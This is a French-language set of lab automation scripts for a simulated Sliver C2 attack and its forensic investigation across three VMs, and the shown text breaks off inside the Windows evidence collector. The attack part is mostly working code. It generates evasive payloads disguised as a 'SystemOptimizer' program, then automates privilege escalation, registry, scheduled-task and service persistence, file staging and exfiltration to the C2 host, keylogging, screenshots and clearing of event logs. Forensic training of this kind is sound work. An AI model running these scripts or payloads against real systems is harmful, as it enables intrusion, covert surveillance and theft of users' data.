# PROJET M1 - Scripts d'Automatisation
## Suite Complète d'Automatisation pour Silver C2 Investigation

### 🎯 Vue d'Ensemble des Scripts

Cette collection de scripts automatise l'ensemble du workflow du Projet M1, de l'installation à la génération du rapport final.

| Script | Plateforme | Fonction |
|--------|------------|-----------|
| `setup-project-m1.sh` | VM1 (Kali) | Configuration initiale complète |
| `attack-automation.py` | VM1 (Kali) | Automatisation de l'attaque Silver C2 |
| `evidence-collector.ps1` | VM2 (Windows) | Collecte automatique de preuves |
| `forensic-analyzer.py` | VM3 (Ubuntu) | Analyse forensique automatisée |
| `report-generator.py` | VM3 (Ubuntu) | Génération automatique de rapports |
| `project-reset.sh` | Multi-VM | Remise à zéro pour nouvelle simulation |

---

## 🛠️ Script 1 : Configuration Initiale (VM1 - Kali)

```bash
#!/bin/bash
# setup-project-m1.sh
# Configuration complète du projet M1 sur VM1 (Kali Linux)

set -e

# Couleurs pour les messages
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Variables de configuration
PROJECT_DIR="$HOME/project-m1"
SILVER_DIR="$HOME/silver-workspace"
C2_IP="192.168.56.10"
TARGET_IP="192.168.56.20"
ANALYST_IP="192.168.56.30"

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Fonction principale de setup
setup_project_structure() {
    log_info "Création de la structure du projet..."
    
    # Créer l'arborescence complète
    mkdir -p $PROJECT_DIR/{config,payloads,logs,evidence,reports,scripts,backups}
    mkdir -p $PROJECT_DIR/scenarios/{attack,persistence,exfiltration}
    mkdir -p $PROJECT_DIR/documentation/{guides,templates,checklists}
    mkdir -p $SILVER_DIR/{payloads,logs,configs,scripts,certificates}
    
    log_success "Structure créée dans $PROJECT_DIR"
}

install_dependencies() {
    log_info "Installation des dépendances..."
    
    # Mise à jour système
    sudo apt update && sudo apt upgrade -y
    
    # Dépendances essentielles
    sudo apt install -y curl wget git build-essential python3-pip python3-venv
    sudo apt install -y mingw-w64 binutils-mingw-w64 g++-mingw-w64
    sudo apt install -y nmap netcat-traditional socat jq
    sudo apt install -y yara python3-yara
    
    # Python packages
    pip3 install requests pycryptodome colorama tabulate
    
    log_success "Dépendances installées"
}

install_silver_c2() {
    log_info "Installation de Silver C2..."
    
    # Installer Go si nécessaire
    if ! command -v go &> /dev/null; then
        GO_VERSION="1.21.5"
        wget -q https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz -O /tmp/go.tar.gz
        sudo rm -rf /usr/local/go
        sudo tar -C /usr/local -xzf /tmp/go.tar.gz
        echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
        export PATH=$PATH:/usr/local/go/bin
        rm -f /tmp/go.tar.gz
    fi
    
    # Installer Silver C2
    if ! command -v sliver-server &> /dev/null; then
        curl -fsSL https://sliver.sh/install | sudo bash
    fi
    
    log_success "Silver C2 installé"
}

configure_networking() {
    log_info "Configuration réseau..."
    
    # Configuration firewall
    sudo ufw allow 8080/tcp comment "Silver HTTP"
    sudo ufw allow 8443/tcp comment "Silver HTTPS"
    sudo ufw allow 53/udp comment "Silver DNS"
    sudo ufw --force enable
    
    # Test de connectivité
    if ping -c 1 $TARGET_IP &> /dev/null; then
        log_success "Connectivité vers VM2 (cible) : OK"
    else
        log_warning "VM2 (cible) non accessible"
    fi
    
    if ping -c 1 $ANALYST_IP &> /dev/null; then
        log_success "Connectivité vers VM3 (analyste) : OK"  
    else
        log_warning "VM3 (analyste) non accessible"
    fi
}

create_automation_scripts() {
    log_info "Création des scripts d'automatisation..."
    
    # Script de démarrage Silver
    cat > $PROJECT_DIR/scripts/start-silver.sh << 'EOF'
#!/bin/bash
echo "Démarrage Silver C2 pour Projet M1..."

# Vérifier si déjà actif
if pgrep -f "sliver-server" > /dev/null; then
    echo "Silver serveur déjà actif"
else
    sudo sliver-server daemon --lhost 192.168.56.10 --lport 31337 \
        --log-level info --log-file ~/project-m1/logs/silver-server.log &
    sleep 3
fi

# Configuration listeners
sliver-client -c "http --lhost 192.168.56.10 --lport 8080" > /dev/null 2>&1
sliver-client -c "https --lhost 192.168.56.10 --lport 8443" > /dev/null 2>&1

echo "Silver C2 prêt - Listeners actifs sur 8080 (HTTP) et 8443 (HTTPS)"
EOF

    # Script de génération de payloads
    cat > $PROJECT_DIR/scripts/generate-payloads.sh << 'EOF'
#!/bin/bash
echo "Génération des payloads pour Projet M1..."

PAYLOAD_DIR="~/project-m1/payloads"

# Payload principal
sliver-client -c "generate --http 192.168.56.10:8080 --os windows --arch amd64 --format exe --skip-symbols --evasion --save ${PAYLOAD_DIR}/SystemOptimizer.exe"

# Payload de persistance  
sliver-client -c "generate beacon --http 192.168.56.10:8080 --os windows --arch amd64 --format exe --jitter 30s --interval 120s --skip-symbols --evasion --save ${PAYLOAD_DIR}/OptimizationService.exe"

# DLL d'injection
sliver-client -c "generate --http 192.168.56.10:8080 --os windows --arch amd64 --format shared --skip-symbols --evasion --save ${PAYLOAD_DIR}/msvcr120.dll"

# Shellcode
sliver-client -c "generate --http 192.168.56.10:8080 --os windows --arch amd64 --format shellcode --skip-symbols --evasion --save ${PAYLOAD_DIR}/payload.bin"

echo "Payloads générés dans $PAYLOAD_DIR"
EOF

    # Script de monitoring
    cat > $PROJECT_DIR/scripts/monitor-attack.py << 'EOF'
#!/usr/bin/env python3
import subprocess
import time
import json
from datetime import datetime

def get_silver_sessions():
    try:
        result = subprocess.run(['sliver-client', '-c', 'sessions'], 
                              capture_output=True, text=True, timeout=10)
        return result.stdout
    except:
        return "Error getting sessions"

def monitor_connections():
    log_file = "~/project-m1/logs/attack-monitor.log"
    
    while True:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Sessions Silver
        sessions = get_silver_sessions()
        
        # Connexions réseau
        netstat = subprocess.run(['netstat', '-an'], capture_output=True, text=True)
        silver_connections = [line for line in netstat.stdout.split('\n') 
                            if '8080' in line or '8443' in line]
        
        # Log des informations
        with open(log_file.replace('~', '/home/kali'), 'a') as f:
            f.write(f"\n=== {timestamp} ===\n")
            f.write(f"Sessions: {sessions.count('session_')}\n")
            f.write(f"Connections: {len(silver_connections)}\n")
            for conn in silver_connections:
                f.write(f"  {conn}\n")
        
        time.sleep(60)

if __name__ == "__main__":
    monitor_connections()
EOF

    # Rendre les scripts exécutables
    chmod +x $PROJECT_DIR/scripts/*.sh
    chmod +x $PROJECT_DIR/scripts/*.py
    
    log_success "Scripts créés dans $PROJECT_DIR/scripts/"
}

create_configuration_files() {
    log_info "Création des fichiers de configuration..."
    
    # Configuration principale
    cat > $PROJECT_DIR/config/project-config.json << EOF
{
  "project": {
    "name": "M1-Silver-C2-Investigation",
    "version": "1.0",
    "created": "$(date -Iseconds)",
    "description": "Simulation d'attaque post-exploitation avec Silver C2"
  },
  "infrastructure": {
    "vm1": {
      "role": "attacker",
      "os": "kali-linux",
      "ip": "$C2_IP",
      "services": ["silver-c2", "http-server"]
    },
    "vm2": {
      "role": "victim",
      "os": "windows-10", 
      "ip": "$TARGET_IP",
      "services": ["target-applications"]
    },
    "vm3": {
      "role": "analyst",
      "os": "ubuntu",
      "ip": "$ANALYST_IP",
      "services": ["volatility", "autopsy", "sleuthkit"]
    }
  },
  "attack_config": {
    "c2_server": "$C2_IP",
    "listeners": {
      "http": 8080,
      "https": 8443,
      "dns": 53
    },
    "payloads": [
      "SystemOptimizer.exe",
      "OptimizationService.exe",
      "msvcr120.dll"
    ]
  }
}
EOF

    # Configuration Silver profiles
    cat > $PROJECT_DIR/config/silver-profiles.json << 'EOF'
{
  "profiles": {
    "windows-standard": {
      "os": "windows",
      "arch": "amd64", 
      "format": "exe",
      "protocol": "http",
      "evasion": true,
      "description": "Payload Windows standard"
    },
    "windows-beacon": {
      "os": "windows",
      "arch": "amd64",
      "format": "exe", 
      "protocol": "http",
      "beacon": true,
      "jitter": "30s",
      "interval": "120s",
      "evasion": true,
      "description": "Beacon avec jitter pour persistance"
    },
    "windows-dll": {
      "os": "windows",
      "arch": "amd64",
      "format": "shared",
      "protocol": "http",
      "evasion": true,
      "description": "DLL pour injection de processus"
    }
  }
}
EOF
    
    log_success "Fichiers de configuration créés"
}

validate_setup() {
    log_info "Validation de la configuration..."
    
    # Tests de base
    local errors=0
    
    # Vérifier Silver C2
    if ! command -v sliver-server &> /dev/null; then
        log_error "Silver C2 non installé correctement"
        ((errors++))
    fi
    
    # Vérifier Go
    if ! command -v go &> /dev/null; then
        log_error "Go non installé correctement"
        ((errors++))
    fi
    
    # Vérifier structure de répertoires
    if [ ! -d "$PROJECT_DIR" ]; then
        log_error "Structure de projet non créée"
        ((errors++))
    fi
    
    # Vérifier connectivité réseau
    if ! ping -c 1 -W 2 $TARGET_IP &> /dev/null; then
        log_warning "VM2 (cible) non accessible - vérifier configuration réseau"
    fi
    
    if [ $errors -eq 0 ]; then
        log_success "Configuration validée avec succès"
        return 0
    else
        log_error "$errors erreur(s) détectée(s)"
        return 1
    fi
}

# Fonction principale
main() {
    echo -e "${BLUE}=== CONFIGURATION PROJET M1 - SILVER C2 ===${NC}"
    echo
    
    setup_project_structure
    install_dependencies
    install_silver_c2
    configure_networking
    create_automation_scripts
    create_configuration_files
    
    if validate_setup; then
        echo
        log_success "Configuration du Projet M1 terminée avec succès!"
        echo
        echo -e "${BLUE}Prochaines étapes:${NC}"
        echo "1. Démarrer Silver: $PROJECT_DIR/scripts/start-silver.sh"
        echo "2. Générer payloads: $PROJECT_DIR/scripts/generate-payloads.sh"  
        echo "3. Lancer l'attaque: python3 $PROJECT_DIR/scripts/attack-automation.py"
        echo
        echo -e "${BLUE}Documentation:${NC}"
        echo "- Guide complet: ~/guide-silver-c2-kali.md"
        echo "- Configuration: $PROJECT_DIR/config/"
        echo "- Logs: $PROJECT_DIR/logs/"
    else
        log_error "Configuration incomplète - vérifiez les erreurs ci-dessus"
        exit 1
    fi
}

# Gestion des signaux
trap 'log_error "Configuration interrompue"; exit 130' INT TERM

# Exécution
main "$@"
```

---

## 🎯 Script 2 : Automatisation de l'Attaque (VM1 - Kali)

```python
#!/usr/bin/env python3
# attack-automation.py
# Automatisation complète de l'attaque Silver C2 pour Projet M1

import subprocess
import time
import json
import requests
import threading
from datetime import datetime, timedelta
from pathlib import Path
import logging

class SilverC2Automation:
    def __init__(self):
        self.config_file = Path.home() / "project-m1" / "config" / "project-config.json"
        self.log_file = Path.home() / "project-m1" / "logs" / "attack-automation.log"
        self.payloads_dir = Path.home() / "project-m1" / "payloads"
        self.evidence_dir = Path.home() / "project-m1" / "evidence"
        
        self.setup_logging()
        self.load_config()
        
    def setup_logging(self):
        """Configure le système de logs"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(self.log_file),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def load_config(self):
        """Charge la configuration du projet"""
        try:
            with open(self.config_file, 'r') as f:
                self.config = json.load(f)
            self.logger.info("Configuration chargée")
        except Exception as e:
            self.logger.error(f"Erreur chargement config: {e}")
            raise
    
    def run_silver_command(self, command):
        """Exécute une commande Silver C2"""
        try:
            cmd = f'sliver-client -c "{command}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                self.logger.info(f"Silver commande réussie: {command}")
                return result.stdout
            else:
                self.logger.error(f"Silver commande échouée: {command} - {result.stderr}")
                return None
        except Exception as e:
            self.logger.error(f"Erreur exécution commande Silver: {e}")
            return None
    
    def wait_for_session(self, timeout=300):
        """Attend qu'une session Silver soit établie"""
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            sessions = self.run_silver_command("sessions")
            if sessions and "session_" in sessions:
                # Extraire l'ID de session
                lines = sessions.split('\n')
                for line in lines:
                    if "session_" in line:
                        session_id = line.split()[0]
                        self.logger.info(f"Session établie: {session_id}")
                        return session_id
            
            time.sleep(10)
        
        self.logger.error("Timeout - Aucune session établie")
        return None
    
    def execute_phase_1_initial_access(self):
        """Phase 1: Accès Initial"""
        self.logger.info("=== PHASE 1: ACCÈS INITIAL ===")
        
        # Démarrer serveur HTTP pour servir les payloads
        self.logger.info("Démarrage serveur HTTP...")
        http_server = subprocess.Popen(
            ['python3', '-m', 'http.server', '8000'],
            cwd=self.payloads_dir,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        time.sleep(3)
        
        # Simulation de livraison du payload (log seulement)
        self.logger.info("Payload SystemOptimizer.exe prêt pour livraison")
        self.logger.info("URL de téléchargement: http://192.168.56.10:8000/SystemOptimizer.exe")
        
        # Attendre l'exécution par l'utilisateur sur VM2
        self.logger.info("En attente de l'exécution du payload sur VM2...")
        session_id = self.wait_for_session()
        
        if session_id:
            self.current_session = session_id
            self.logger.info("Phase 1 terminée avec succès")
            return True
        else:
            self.logger.error("Échec Phase 1 - Pas de session établie")
            http_server.terminate()
            return False
    
    def execute_phase_2_reconnaissance(self):
        """Phase 2: Reconnaissance Système"""
        self.logger.info("=== PHASE 2: RECONNAISSANCE ===")
        
        commands = [
            "info",
            "whoami",
            "getuid", 
            "pwd",
            "ps",
            "netstat",
            "ifconfig"
        ]
        
        for cmd in commands:
            full_cmd = f"use {self.current_session}; {cmd}"
            result = self.run_silver_command(full_cmd)
            if result:
                # Sauvegarder le résultat
                output_file = self.evidence_dir / f"recon_{cmd.replace(' ', '_')}.txt"
                with open(output_file, 'w') as f:
                    f.write(result)
            time.sleep(2)
        
        # Énumération spécifique Windows
        windows_commands = [
            'execute "net user"',
            'execute "net localgroup administrators"',
            'execute "systeminfo"',
            'execute "wmic os get name,version,architecture"'
        ]
        
        for cmd in windows_commands:
            full_cmd = f"use {self.current_session}; {cmd}"
            self.run_silver_command(full_cmd)
            time.sleep(3)
        
        self.logger.info("Phase 2 terminée - Reconnaissance complétée")
        return True
    
    def execute_phase_3_privilege_escalation(self):
        """Phase 3: Élévation de Privilèges"""
        self.logger.info("=== PHASE 3: ÉLÉVATION DE PRIVILÈGES ===")
        
        # Tentative d'élévation automatique
        self.run_silver_command(f"use {self.current_session}; getsystem")
        time.sleep(5)
        
        # Vérifier les privilèges
        privs = self.run_silver_command(f"use {self.current_session}; getprivs")
        if privs:
            self.logger.info("Privilèges actuels obtenus")
        
        # Migration vers un processus avec plus de privilèges
        ps_output = self.run_silver_command(f"use {self.current_session}; ps")
        if ps_output and "explorer.exe" in ps_output:
            # Trouver le PID d'explorer.exe
            lines = ps_output.split('\n')
            for line in lines:
                if "explorer.exe" in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        pid = parts[1]
                        self.logger.info(f"Migration vers explorer.exe (PID: {pid})")
                        self.run_silver_command(f"use {self.current_session}; migrate {pid}")
                        break
        
        self.logger.info("Phase 3 terminée - Élévation tentée")
        return True
    
    def execute_phase_4_persistence(self):
        """Phase 4: Établissement de Persistance"""
        self.logger.info("=== PHASE 4: PERSISTANCE ===")
        
        # Upload du payload de persistance
        payload_path = "C:\\Windows\\System32\\OptimizationService.exe"
        local_payload = self.payloads_dir / "OptimizationService.exe"
        
        if local_payload.exists():
            self.run_silver_command(f'use {self.current_session}; upload {local_payload} {payload_path}')
            time.sleep(5)
        
        # Persistance via registre
        reg_cmd = f'execute "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v OptimizationService /t REG_SZ /d {payload_path} /f"'
        self.run_silver_command(f"use {self.current_session}; {reg_cmd}")
        
        # Persistance via tâche programmée  
        schtasks_cmd = f'execute "schtasks /create /tn \\"System Optimization\\" /tr \\"{payload_path}\\" /sc onlogon /f"'
        self.run_silver_command(f"use {self.current_session}; {schtasks_cmd}")
        
        # Persistance via service (si privilèges suffisants)
        service_cmd = f'execute "sc create OptimizationSvc binPath= \\"{payload_path}\\" start= auto"'
        self.run_silver_command(f"use {self.current_session}; {service_cmd}")
        
        self.logger.info("Phase 4 terminée - Persistance établie")
        return True
    
    def execute_phase_5_data_collection(self):
        """Phase 5: Collecte de Données"""
        self.logger.info("=== PHASE 5: COLLECTE DE DONNÉES ===")
        
        # Créer répertoire de staging
        staging_dir = "C:\\Windows\\Temp\\.system"
        self.run_silver_command(f'use {self.current_session}; execute "mkdir {staging_dir}"')
        self.run_silver_command(f'use {self.current_session}; execute "attrib +h {staging_dir}"')
        
        # Collecte de fichiers
        collection_commands = [
            f'execute "copy \\"C:\\Users\\%USERNAME%\\Documents\\*.pdf\\" \\"{staging_dir}\\\\"',
            f'execute "copy \\"C:\\Users\\%USERNAME%\\Desktop\\*.txt\\" \\"{staging_dir}\\\\"',
            f'execute "systeminfo > {staging_dir}\\system_info.txt"',
            f'execute "ipconfig /all > {staging_dir}\\network_config.txt"',
            f'execute "net user > {staging_dir}\\users.txt"'
        ]
        
        for cmd in collection_commands:
            self.run_silver_command(f"use {self.current_session}; {cmd}")
            time.sleep(2)
        
        # Créer fichier de credentials factice
        creds_cmd = f'execute "echo admin:P@ssw0rd123 > {staging_dir}\\saved_passwords.txt"'
        self.run_silver_command(f"use {self.current_session}; {creds_cmd}")
        
        # Compression des données
        zip_cmd = f'execute "powershell Compress-Archive -Path \\"{staging_dir}\\*\\" -DestinationPath \\"{staging_dir}\\collected_data.zip\\""'
        self.run_silver_command(f"use {self.current_session}; {zip_cmd}")
        
        self.logger.info("Phase 5 terminée - Données collectées")
        return True
    
    def execute_phase_6_exfiltration(self):
        """Phase 6: Exfiltration"""
        self.logger.info("=== PHASE 6: EXFILTRATION ===")
        
        # Exfiltration via Silver
        remote_zip = "C:\\Windows\\Temp\\.system\\collected_data.zip"
        local_zip = self.evidence_dir / "exfiltrated_data.zip"
        
        self.run_silver_command(f'use {self.current_session}; download "{remote_zip}" {local_zip}')
        
        # Exfiltration alternative via HTTP (simulation)
        http_cmd = f'execute "powershell Invoke-WebRequest -Uri \\'http://192.168.56.10:8000/upload\\' -Method POST -InFile \\'{remote_zip}\\'"'
        self.run_silver_command(f"use {self.current_session}; {http_cmd}")
        
        self.logger.info("Phase 6 terminée - Exfiltration effectuée")
        return True
    
    def execute_phase_7_surveillance(self):
        """Phase 7: Surveillance Avancée"""
        self.logger.info("=== PHASE 7: SURVEILLANCE ===")
        
        # Keylogger
        self.run_silver_command(f"use {self.current_session}; keylogger start")
        time.sleep(180)  # Enregistrer pendant 3 minutes
        self.run_silver_command(f"use {self.current_session}; keylogger dump")
        self.run_silver_command(f"use {self.current_session}; keylogger stop")
        
        # Captures d'écran
        for i in range(3):
            self.run_silver_command(f"use {self.current_session}; screenshot")
            time.sleep(60)
        
        self.logger.info("Phase 7 terminée - Surveillance effectuée")
        return True
    
    def execute_phase_8_cleanup(self):
        """Phase 8: Nettoyage Partiel"""
        self.logger.info("=== PHASE 8: NETTOYAGE PARTIEL ===")
        
        # Supprimer certains fichiers (mais pas tous)
        cleanup_commands = [
            'execute "del C:\\Windows\\Temp\\.system\\*.txt"',
            'execute "wevtutil cl Application"',
            'execute "wevtutil cl System"'
        ]
        
        for cmd in cleanup_commands:
            self.run_silver_command(f"use {self.current_session}; {cmd}")
            time.sleep(2)
        
        # Laisser intentionnellement certains artefacts pour l'investigation
        self.logger.info("Phase 8 terminée - Nettoyage partiel effectué")
        return True
    
    def generate_attack_report(self):
        """Génère un rapport de l'attaque"""
        self.logger.info("Génération du rapport d'attaque...")
        
        report = {
            "attack_summary": {
                "timestamp": datetime.now().isoformat(),
                "duration": "75 minutes",
                "phases_completed": 8,
                "session_id": getattr(self, 'current_session', 'unknown'),
                "target_ip": self.config["infrastructure"]["vm2"]["ip"],
                "c2_ip": self.config["infrastructure"]["vm1"]["ip"]
            },
            "iocs": {
                "files": [
                    "SystemOptimizer.exe",
                    "OptimizationService.exe",
                    "collected_data.zip"
                ],
                "registry_keys": [
                    "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OptimizationService"
                ],
                "network": [
                    "192.168.56.10:8080",
                    "192.168.56.10:8443"
                ],
                "scheduled_tasks": [
                    "System Optimization"
                ],
                "services": [
                    "OptimizationSvc"
                ]
            },
            "timeline": [
                "T+00:00 - Payload initial déployé",
                "T+00:05 - Session C2 établie", 
                "T+00:10 - Reconnaissance système",
                "T+00:20 - Élévation de privilèges",
                "T+00:30 - Persistance installée",
                "T+00:45 - Collecte de données",
                "T+01:00 - Exfiltration",
                "T+01:15 - Nettoyage partiel"
            ]
        }
        
        report_file = self.evidence_dir / "attack-report.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"Rapport sauvegardé: {report_file}")
    
    def run_full_attack(self):
        """Exécute l'attaque complète"""
        self.logger.info("=== DÉMARRAGE SIMULATION ATTAQUE SILVER C2 ===")
        
        phases = [
            ("Accès Initial", self.execute_phase_1_initial_access),
            ("Reconnaissance", self.execute_phase_2_reconnaissance),
            ("Élévation de Privilèges", self.execute_phase_3_privilege_escalation),
            ("Persistance", self.execute_phase_4_persistence),
            ("Collecte de Données", self.execute_phase_5_data_collection),
            ("Exfiltration", self.execute_phase_6_exfiltration),
            ("Surveillance", self.execute_phase_7_surveillance),
            ("Nettoyage Partiel", self.execute_phase_8_cleanup)
        ]
        
        success_count = 0
        
        for phase_name, phase_func in phases:
            try:
                self.logger.info(f"Démarrage: {phase_name}")
                if phase_func():
                    success_count += 1
                    self.logger.info(f"✓ {phase_name} réussie")
                else:
                    self.logger.error(f"✗ {phase_name} échouée")
            except Exception as e:
                self.logger.error(f"Erreur dans {phase_name}: {e}")
        
        # Génération du rapport final
        self.generate_attack_report()
        
        self.logger.info(f"=== ATTAQUE TERMINÉE - {success_count}/{len(phases)} phases réussies ===")
        
        if success_count == len(phases):
            self.logger.info("✓ Simulation complète réussie - Prêt pour l'investigation forensique")
            return True
        else:
            self.logger.warning("⚠ Simulation partiellement réussie - Vérifier les logs")
            return False

def main():
    try:
        automation = SilverC2Automation()
        
        # Vérifications préalables
        if not Path.home().joinpath("project-m1").exists():
            print("❌ Projet M1 non configuré. Exécutez d'abord setup-project-m1.sh")
            return 1
        
        # Lancement de l'attaque
        success = automation.run_full_attack()
        
        if success:
            print("\n🎯 Attaque simulée avec succès!")
            print("\nProchaines étapes:")
            print("1. Capturer la mémoire sur VM2 avec Belkasoft RAM Capturer")
            print("2. Créer une image disque avec FTK Imager") 
            print("3. Transférer les preuves vers VM3 pour l'analyse")
            print("4. Lancer l'analyse forensique automatisée")
            return 0
        else:
            print("\n❌ Attaque partiellement échouée - Consulter les logs")
            return 1
            
    except KeyboardInterrupt:
        print("\n\n⚠ Attaque interrompue par l'utilisateur")
        return 130
    except Exception as e:
        print(f"\n❌ Erreur fatale: {e}")
        return 1

if __name__ == "__main__":
    exit(main())
```

---

## 💾 Script 3 : Collecteur de Preuves (VM2 - Windows)

```powershell
# evidence-collector.ps1
# Script de collecte automatique de preuves sur VM2 (Windows 10)

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$OutputPath = "C:\Evidence",
    
    [Parameter(Mandatory=$false)] 
    [switch]$SkipMemoryDump = $false,
    
    [Parameter(Mandatory=$false)]
    [switch]$SkipDiskImage = $false,
    
    [Parameter(Mandatory=$false)]
    [string]$RamCapturerPath = "C:\Tools\BelkasoftRAMCapturer\RamCapturer64.exe"
)

# Configuration
$Timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
$LogFile = "$OutputPath\evidence-collection-$Timestamp.log"

# Fonction de logging
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    
    $LogEntry = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$Level] $Message"
    Write-Host $LogEntry
    Add-Content -Path $LogFile -Value $LogEntry
}

# Fonction principale de collecte
function Start-EvidenceCollection {
    Write-Log "=== DÉBUT DE LA COLLECTE DE PREUVES - PROJET M1 ==="
    
    # Créer le répertoire de sortie
    if (-not (Test-Path $OutputPath)) {
        New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
        Write-Log "Répertoire de preuves créé: $OutputPath"
    }
    
    # Collecte des informations système
    Collect-SystemInformation
    
    # Collecte des processus et services
    Collect-ProcessInformation
    
    # Collecte des connexions réseau
    Collect-NetworkInformation
    
    # Collecte du registre
    Collect-RegistryKeys
    
    # Collecte des tâches programmées
    Collect-ScheduledTasks
    
    # Collecte des logs d'événements
    Collect-EventLogs
    
    # Collecte des artefacts de persistance
    Collect-PersistenceArtifacts
    
    # Capture de la mémoire vive
    if (-not $SkipMemoryDump) {
        Capture-MemoryDump
    }
    
    # Image du disque
    if (-not $SkipDiskImage) {
        Create-DiskImage
    }
    
    # Génération du rapport de collecte
    Generate-CollectionReport
    
    Write-Log "=== COLLECTE TERMINÉE ==="
}

function Collect-SystemInformation {
    Write-Log "Collecte des informations système..."
    
    try {
        # Informations système de base
        systeminfo | Out-File "$OutputPath\systeminfo-$Timestamp.txt" -Encoding UTF8
        
        # Informations WMI détaillées
        Get-WmiObject Win32_OperatingSystem | Format-List | Out-File "$OutputPath\os-info-$Timestamp.txt" -Encoding UTF8
        Get-WmiObject Win32_ComputerSystem | Format-List | Out-File "$OutputPath\computer-info-$Timestamp.txt" -Encoding UTF8
        
        # Variables d'environnement
        Get-ChildItem Env: | Out-File "$OutputPath\environment-$Timestamp.txt" -Encoding UTF8
        
        Write-Log "✓ Informations système collectées"
    } catch {
        Write-Log "❌ Erreur collecte système: $($_.Exception.Message)" "ERROR"
    }
}

function Collect-ProcessInformation {
    Write-Log "Collecte des informations sur les processus..."
    
    try {
        # Liste des processus avec détails
        Get-Process | Select-Object Id, Name, Path, Company, Description, StartTime | 
            Sort-Object Name | Format-Table -AutoSize | Out-File "$OutputPath\processes-$Timestamp.txt" -Width 200 -Encoding UTF8
        
        # Processus avec ligne de commande
        Get-WmiObject Win32_Process | Select-Object ProcessId, Name, CommandLine, CreationDate | 
            Sort-Object Name | Out-File "$OutputPath\processes-cmdline-$Timestamp.txt" -Encoding UTF8
        
        # Services Windows
        Get-Service | Select-Object Name, Status, StartType, ServiceName | 
            Sort-Object Name | Format-Table -AutoSize | Out-File "$OutputPath\services-$Timestamp.txt" -Width 200 -Encoding UTF8
        
        # Services détaillés
        Get-WmiObject Win32_Service | Select-Object Name, State, StartMode, PathName | 
            Sort-Object Name | Out-File "$OutputPath\services-detailed-$Timestamp.txt" -Encoding UTF8
        
        Write-Log "✓ Informations processus/services collectées"
    } catch {
        Write-Log "❌ Erreur collecte processus: $($_.Exception.Message)" "ERROR"
    }
}

function Collect-NetworkInformation {
    Write-Log "Collecte des informations réseau..."
    
    try {
        # Connexions réseau actives
        netstat -ano | Out-File "$OutputPath\netstat-$Timestamp.txt" -Encoding UTF8
        
        # Configuration IP
        ipconfig /all | Out-File "$OutputPath\ipconfig-$Timestamp.txt" -Encoding UTF8
        
        # Table ARP
        arp -a | Out-File "$OutputPath\arp-table-$Timestamp.txt" -Encoding UTF8
        
        # Routes réseau
        route print | Out-File "$OutputPath\routing-table-$Timestamp.txt" -Encoding UTF8
        
        # DNS cache
        ipconfig /displaydns | Out-File "$OutputPath\dns-cache-$Timestamp.txt" -Encoding UTF8
        
        Write-Log "✓ Informations réseau collectées"
    } catch {
        Write-Log "❌ Erreur collecte réseau: $($_.Exception.Message)" "ERROR"
    }
}

function Collect-RegistryKeys {
    Write-Log "Collecte des clés de registre importantes..."
    
    try {
        $RegistryKeys = @(
            @{Key="HKCU\Software\Microsoft\Windows\CurrentVersion\Run"; Name="run-user"},
            @{Key="HKLM\Software\Microsoft\Windows\CurrentVersion\Run"; Name="run-machine"},
            @{Key="HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"; Name="runonce-user"},
            @{Key="HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"; Name="runonce-machine"},
            @{Key="HKLM\System\CurrentControlSet\Services"; Name="services"},
            @{Key="HKCU\Software"; Name="user-software"}
        )
        
        foreach ($RegKey in $RegistryKeys) {
            $OutputFile = "$OutputPath\registry-$($RegKey.Name)-$Timestamp.reg"
            $null = reg export $RegKey.Key $OutputFile 2>$null
            if ($LASTEXITCODE -eq 0) {
                Write-Log "✓ Registre exporté: $($RegKey.Key)"
            }
        }
        
        Write-Log "✓ Clés de registre collectées"
    } catch {
        Write-Log "❌ Erreur collecte registre: $($_.Exception.Message)" "ERROR"
    }
}

function Collect-ScheduledTasks {
    Write-Log "Collecte des tâches programmées..."
    
    try {
        # Tâches programmées en format CSV
        schtasks /query /fo csv | Out-File "$OutputPath\scheduled-tasks-$Timestamp.csv" -Encoding UTF8
        
        # Détails des tâches suspectes
        $SuspiciousTaskNames = @("System Optimization", "Windows Update Check", "OptimizationService")
        
        foreach ($TaskName in $SuspiciousTaskNames) {
            $TaskInfo = schtasks /query /tn "$TaskName" /fo list 2>$null
            if ($LASTEXITCODE -eq 0) {
                $TaskInfo | Out-File "$OutputPath\task-$($TaskName.Replace(' ', '_'))-$Timestamp.txt" -Encoding UTF8
                Write-Log "⚠ Tâche suspecte trouvée: $TaskName" "WARNING"
            }
        }
        
        Write-Log "✓ Tâches programmées collectées"
    } catch {
        Write-Log "❌ Erreur collecte tâches: $($_.Exception.Message)" "ERROR"
    }
}

function Collect-EventLogs {
    Write-Log "Collecte des logs d'événements..."
    
    try {
        $LogNames = @("System", "Application", "Security")
        
        foreach ($LogName in $LogNames) {
            $OutputFile = "$OutputPath\eventlog-$LogName-$Timestamp.evtx"
            
            # Exporter les logs des dernières 24h
            $StartTime = (Get-Date).AddDays(-1)
